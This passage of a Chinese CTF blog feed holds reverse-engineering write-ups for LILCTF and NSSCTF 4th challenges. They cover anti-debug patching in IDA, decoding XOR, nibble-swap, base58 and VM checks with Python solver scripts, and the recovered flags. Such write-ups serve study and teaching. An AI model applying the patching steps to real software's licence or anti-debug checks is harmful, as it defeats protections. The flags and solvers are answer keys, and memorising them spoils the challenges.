class="hljs-type">System.Windows.Forms.MessageBoxIcon</span>]::Information)<br>&#125;)<br><br><span class="hljs-variable">$Form</span>.ShowDialog() | <span class="hljs-built_in">Out-Null</span><br></code></pre></td></tr></table></figure><p>LILCTF{be_vigilant_against_phishing}</p><h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p>题目给的是一个安装包，下载下来后直接安装文件，就是一个登录的页面，要求输入注册码，注册码就是flag，所以解题的思路就是通过分析安装得到的文件得到注册码</p><p>整体来说这个题目难度不大，但是需要一步步动调来确定输入函数的位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206409.png" alt="image-20250820005109524"></p><p>安装好的demo_code_editor.exe打开拖入ida</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200048966.png" alt="image-20250820004857888"></p><p>我们直接进入ida时看到的主函数入口是winmain，也可以从那里开始进行调试，这道题就是动调找主要函数的过程。</p><p>如果没有什么思路，我们就可以直接从start函数这里开始调试</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207769.png" alt="image-20250820004740860"></p><p>进入sub_401150函数，我们可以利用动调或者直接分析函数内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206400.png" alt="image-20250820005827378"></p><p>sub_417C00就是入口函数，点进去也能看到这个窗口程序的主函数winmain</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200101149.png" alt="image-20250820010117080"></p><p>可以在函数开头下断点，然后f8一步步动调</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200103384.png" alt="image-20250820010341303"></p><p>发现在sub_4015E0函数处就直接退出了，说明有反调试</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207412.png" alt="image-20250820010432571"></p><p>可以在反调试的跳转函数那里下断点，在动调的时候改zf，或者直接将jz改为jmp（74改为EB）</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206270.png" alt="image-20250820010446802"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207226.png" alt="image-20250820010938002"></p><p>顺便把exit退出函数给nop掉，然后patch保存，这样就顺利地反反调试了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206365.png" alt="image-20250820011418960"></p><p>继续调试，发现程序在运行到sub_403400函数的时候跳出让用户输入注册码，随便输入之后发现程序就直接退出了</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207332.png" alt="image-20250820011626032"></p><p>重新调试，在sub_403400函数下断点然后f7进去一步步调试，发现在QDialog::exec这里让用户输入</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200141258.png" alt="image-20250820011955496"></p><p>重新调试，进入QDialog::exec函数一步步调试<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200136669.png" alt="image-20250820013636591"></p><p>在调试的过程中也可以发现QDialog::exec函数其实是一个窗口生成和输入的函数，在这里的调试过程中随便输入验证不会跳出exit，说明我们没有触碰到exit，也说明我们快接近验证字符串的函数部分了。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200143267.png" alt="image-20250820014308177"></p><p>继续动调，一直到最后看到的退出exit函数，这里没什么技巧，一直f8</p><p>直接跟踪这个函数，于是发现了sub_410100函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207773.png" alt="image-20250820013052924"></p><p>发现这里的QLineEdit::text() → 得到输入的字符串（Qt 的QString），这个函数就是用来验证输入的字符串的，我们成功找到了真正的flag存在的位置，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207376.png" alt="image-20250820013233998"></p><p>在 QLineEdit::text(*(a1[6] + 20));下断点重新调试</p><p>然后再次在QDialog::exec函数输入注册码之后就会跳转到sub_410100，然后再返回看a1的内容，就能得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200155829.png" alt="image-20250820015506728"></p><p>LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}</p><h2 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a><strong>obfusheader.h</strong></h2><p>这题本来想去除花指令，就是一个jz跳转的花指令，但是有点多，就没有去除，好在汇编不太难，可以直接看出加密逻辑</p><p>可以通过搜索字符串找到关键函数的位置，也可以在初始函数这里找到（做过好多道题，一般都会在start函数里的code处是主函数入口）</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236627.png" alt="image-20250827223612464"></p><p>在输入flag这里下断点</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236128.png" alt="image-20250827223629947"></p><p>这里如果输入的字符串长度不对就会直接退出，可以通过调试发现寄存器rax为0x28，长度为40，然后输入之后下硬件断点</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272239519.png" alt="image-20250827223926343"></p><p>第一次调试直接按f9，到这里，这里就是一个比较长度的函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203539.png" alt="image-20250827220320351"></p><p>这里两次调试是与一个随机数异或</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203463.png" alt="image-20250827220338332"></p><p>将xor结束后的测试密文提取出来得到随机数xor的key</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272229434.png" alt="image-20250827222911255"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span>[]=&#123;<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>xf8,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>xa7,<span class="hljs-number">0</span>x43,<span class="hljs-number">0</span>xc8,<span class="hljs-number">0</span>x33,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>xd4,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>x13,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>xa9,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x5c,<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xfd,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x33&#125;<br></code></pre></td></tr></table></figure><p>第四次调试，我没有去除花指令，但也不太影响看汇编，这里就是位运算，将高四位和低四位调换位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272250249.png"></p><p>第五次调试，这里就是按位取反</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272251990.png" alt="image-20250827225146843"></p><p>第六次到这里，cmp比较指令，可以得到密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272245175.png" alt="image-20250827224524025"></p><p>提取出的密文：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">enc</span>[]=&#123;<span class="hljs-number">0</span>x5C,<span class="hljs-number">0</span>xAF,<span class="hljs-number">0</span>xB0,<span class="hljs-number">0</span>x1C,<span class="hljs-number">0</span>xFC,<span class="hljs-number">0</span>xEF,<span class="hljs-number">0</span>xC7,<span class="hljs-number">0</span>x8D,<span class="hljs-number">0</span>x1,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x36,<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>x11,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>x2F,<span class="hljs-number">0</span>x5B,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x2D,<span class="hljs-number">0</span>xF8,<span class="hljs-number">0</span>xD0,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x3F,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xA6,<span class="hljs-number">0</span>x9E,<span class="hljs-number">0</span>x6,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>xCE,<span class="hljs-number">0</span>x7B,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>xBB,<span class="hljs-number">0</span>xDF,<span class="hljs-number">0</span>x1B&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x61</span>,<br>       <span class="hljs-number">0x64</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x21</span>,<br>       <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x33</span>]<br><br>enc = [<span class="hljs-number">0x5C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x88</span>,<br>       <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFA</span>,<br>       <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x9E</span>,<br>       <span class="hljs-number">0x06</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x1B</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_high_low4</span>(<span class="hljs-params">byte</span>):<br>    high_4 = byte &gt;&gt; <span class="hljs-number">4</span><br>    low_4 = byte &amp; <span class="hljs-number">0x0F</span><br>    <span class="hljs-keyword">return</span> (low_4 &lt;&lt; <span class="hljs-number">4</span>) | high_4<br><br>plaintext_bytes = []<br><span class="hljs-keyword">for</span> e_byte, k_byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, key):<br>    not_e = e_byte ^ <span class="hljs-number">0xFF</span><br>    swapped = swap_high_low4(not_e)<br>    plain_byte = swapped ^ k_byte<br>    plaintext_bytes.append(plain_byte)<br><br>plaintext = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> plaintext_bytes])<br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><p>LILCTF{wH4T_is_d47a1I0W_CAN_l7_6e_eaTEN}</p><h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a><strong>Oh_My_Uboot</strong></h2><p>看官方的wp利用qemu进行调试来着，这个方法我还没试，可能出题人忘记隐藏字符串了~</p><p>可以通过搜索字符串直接找到关键密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280109207.png" alt="image-20250828010908027"></p><p>然后交叉引用找到主函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280110775.png" alt="image-20250828011057625"></p><p>unk_6086D357数据会被sub_60813F74解密，这部分应该输出类似英文提示信息</p><p>核心校验函数 <code>sub_60813E3C</code>，生成自定义的base58表</p><p>生成的表是</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[<span class="hljs-string">\]^_`abcdefghi</span><br></code></pre></td></tr></table></figure><p>最后不要忘记xor 72！！</p><p>完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>, <span class="hljs-number">0x30</span>+<span class="hljs-number">58</span>))<br>decode_map = &#123;c: i <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alphabet)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base58_decode</span>(<span class="hljs-params">s</span>):<br>    num = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        num = num * <span class="hljs-number">58</span> + decode_map[ch]<br>    out = []<br>    <span class="hljs-keyword">while</span> num &gt; <span class="hljs-number">0</span>:<br>        out.append(num &amp; <span class="hljs-number">0xFF</span>)<br>        num &gt;&gt;= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">reversed</span>(out))<br><br>cipher = <span class="hljs-string">&quot;5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;&quot;</span><br>decoded = custom_base58_decode(cipher)<br><br>plain = <span class="hljs-built_in">bytes</span>(b ^ <span class="hljs-number">0x72</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decoded)<br><span class="hljs-built_in">print</span>(plain)<br><br></code></pre></td></tr></table></figure><p>LILCTF{Ub007_1s_v3ry_ez}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-4th</title>
    <link href="/2025/08/26/NSSCTF-4th/"/>
    <url>/2025/08/26/NSSCTF-4th/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="checkit"><a href="#checkit" class="headerlink" title="checkit"></a>checkit</h2><p>先用jadx看，关键逻辑在native层的so文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242908.png" alt="img"></p><p> 反编译<code>libcheck.so</code>文件，在Java_com_test_ezre_MainActivity_checkInput函数发现了主要函数实现exec</p><p>点进去看发现是vm的实现</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242522.png" alt="img"></p><p>主要逻辑</p><p> <code>code</code> 在 7→45 这一段每轮处理 两个字符 并把变换结果依次 <code>PUSH</code> 到栈里；然后 50→52 跳到比较循环，按从后到前 <code>POP</code> 出这 50 个值，逐个与 <code>cmp_data[i]</code> 比较，最终输出 “oh!You are right!”.</p><p>对第 <code>i</code> 个字符（从 0 开始）：</p><ul><li>偶数位：<code>v = 0x53 ^ (x - 5)</code> ⇒ 反推 <code>x = (v ^ 0x53) + 5</code></li><li>奇数位：<code>v = (x ^ 0x43) + 14</code> ⇒ 反推 <code>x = (v - 14) ^ 0x43</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">CMP_DATA = [<br>    <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x1D</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x3F</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x3D</span>,<br>    <span class="hljs-number">0x0F</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x3A</span>,<span class="hljs-number">0x3A</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x82</span>,<br>    <span class="hljs-number">0x39</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x70</span>,<br>    <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_even</span>(<span class="hljs-params">v</span>):  <br>    <span class="hljs-keyword">return</span> ((v ^ <span class="hljs-number">0x53</span>) + <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_odd</span>(<span class="hljs-params">v</span>):   <br>    <span class="hljs-keyword">return</span> (((v - <span class="hljs-number">14</span>) &amp; <span class="hljs-number">0xFF</span>) ^ <span class="hljs-number">0x43</span>) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    res = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CMP_DATA[:<span class="hljs-number">50</span>]):<br>        res.append(inv_even(v) <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> inv_odd(v))<br>    s = <span class="hljs-built_in">bytes</span>(res)<br>    <span class="hljs-built_in">print</span>(s.decode(<span class="hljs-string">&quot;latin1&quot;</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solve()<br>NSSCTF&#123;C0ngr@tulation!Y0N_s33m_7o_b3_gO0d_@t_vm!!&#125;<br></code></pre></td></tr></table></figure><h2 id="CrackMe-F-Me"><a href="#CrackMe-F-Me" class="headerlink" title="CrackMe&amp;F***Me"></a>CrackMe&amp;F***Me</h2><p>也是第一次遇到这种题捏，好好学习学习</p><p>先用010将文件末尾改为MEI魔数，**(“MEI 魔术”是指 PyInstaller 打包后的 Windows 可执行文件头部的标记)**</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242911.png" alt="img"></p><p>直接解包会出错，只能解包部分，主要的函数无法解包，这里可以推测可能是对压缩部分有魔改的加密，可以将没有解包的部分内容提取出来，最后单独处理</p><p>这里我给出修改后的pyinstxtractor.py，这个脚本可以解包并且将没有解包成功的部分初始内容提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><code class="hljs 